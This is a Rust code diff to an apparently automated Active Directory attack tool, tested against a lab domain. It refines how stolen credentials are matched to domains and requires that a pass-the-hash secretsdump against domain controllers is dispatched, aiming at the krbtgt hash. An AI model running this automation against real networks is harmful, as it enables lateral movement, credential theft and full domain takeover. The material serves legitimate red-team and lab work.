@@ -66,7 +66,21 @@ pub async fn auto_credential_expansion(
                     // creds generate failed auth that triggers AD lockout.
                     // Domain is extracted from hostname (e.g.,
                     // winterfell.north.sevenkingdoms.local → north.sevenkingdoms.local).
-                    let cred_dom = cred.domain.to_lowercase();
+                    // Resolve NetBIOS domain names (e.g. "NORTH") to FQDN
+                    // via the netbios_to_fqdn map before matching.
+                    let cred_dom = {
+                        let raw = cred.domain.to_lowercase();
+                        if !raw.contains('.') {
+                            state
+                                .netbios_to_fqdn
+                                .get(&raw)
+                                .or_else(|| state.netbios_to_fqdn.get(&cred.domain.to_uppercase()))
+                                .map(|fqdn| fqdn.to_lowercase())
+                                .unwrap_or(raw)
+                        } else {
+                            raw
+                        }
+                    };
                     let targets: Vec<String> = state
                         .hosts
                         .iter()
@@ -109,7 +123,8 @@ pub async fn auto_credential_expansion(
 
                     // Find DCs for this credential's domain (for secretsdump).
                     // Also include child-domain DCs — parent creds are valid in child domains.
-                    let cred_domain = cred.domain.to_lowercase();
+                    // Reuse resolved cred_dom (already NetBIOS→FQDN resolved).
+                    let cred_domain = cred_dom.clone();
                     let dc_ips: Vec<String> = state
                         .domain_controllers
                         .iter()
@@ -265,7 +280,7 @@ pub async fn auto_credential_expansion(
         };
 
         for item in hash_work {
-            let mut any_dispatched = false;
+            let mut dc_sd_dispatched = false;
 
             // Build a credential-like object for pass-the-hash
             let pth_cred = ares_core::models::Credential {
@@ -285,7 +300,6 @@ pub async fn auto_credential_expansion(
                     .request_lateral(target_ip, &pth_cred, "pth_smbclient")
                     .await
                 {
-                    any_dispatched = true;
                     debug!(
                         task_id = %task_id,
                         target = %target_ip,
@@ -317,7 +331,7 @@ pub async fn auto_credential_expansion(
                         if let Ok(Some(task_id)) =
                             dispatcher.request_secretsdump(&dc_ip, &pth_cred, 2).await
                         {
-                            any_dispatched = true;
+                            dc_sd_dispatched = true;
                             debug!(
                                 task_id = %task_id,
                                 dc = %dc_ip,
@@ -338,8 +352,9 @@ pub async fn auto_credential_expansion(
                 }
             }
 
-            // Only mark as processed if at least one task was dispatched.
-            if any_dispatched {
+            // Only mark as fully processed once DC secretsdump has been dispatched.
+            // PTH lateral alone is not sufficient — the critical path is hash→DC→krbtgt.
+            if dc_sd_dispatched {
                 dispatcher
                     .state
                     .write()
